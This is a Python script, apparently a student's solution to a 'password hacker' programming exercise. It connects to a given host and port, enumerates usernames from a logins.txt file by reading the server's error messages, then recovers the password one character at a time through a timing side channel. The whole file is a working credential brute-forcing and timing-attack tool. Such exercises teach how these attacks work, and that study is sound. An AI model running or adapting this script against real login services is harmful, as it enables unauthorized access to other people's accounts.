# write your code here
import argparse
import socket
import string
import json
import time

PASSWORD_LETTERS = string.ascii_letters + string.digits
argument_parser = argparse.ArgumentParser(description="getting information from Server")
argument_parser.add_argument("host", help="positional host name")
argument_parser.add_argument("port", help="positional port", type=int)

known_args, _ = argument_parser.parse_known_args()


def get_logins():
    with open("logins.txt", mode="r", encoding="utf-8") as file:
        yield from [name.strip() for name in file.readlines()]


def find_login(connection, password: str = ' '):
    for login_name in get_logins():
        credentials = {"login": login_name, "password": password}
        creds_str = json.dumps(credentials)
        connection.send(creds_str.encode())
        response = connection.recv(10000)
        if json.loads(response.decode())["result"] == "Wrong password!":
            return login_name


def find_password(connection, login):
    found_password = ""
    while True:
        for letter in PASSWORD_LETTERS:
            credentials = {"login": login, "password": found_password + letter}
            message = json.dumps(credentials).encode()
            connection.send(message)
            start = time.perf_counter()
            response = connection.recv(10000)
            end = time.perf_counter()
            if end - start > 0.02:
                found_password += letter
                break
            if json.loads(response.decode())["result"] == "Connection success!":
                found_password += letter
                return found_password


with socket.socket() as connection:
    connection.connect((known_args.host, known_args.port))
    login = find_login(connection)
    password = find_password(connection, login)
    print(json.dumps({"login": login, "password": password}))
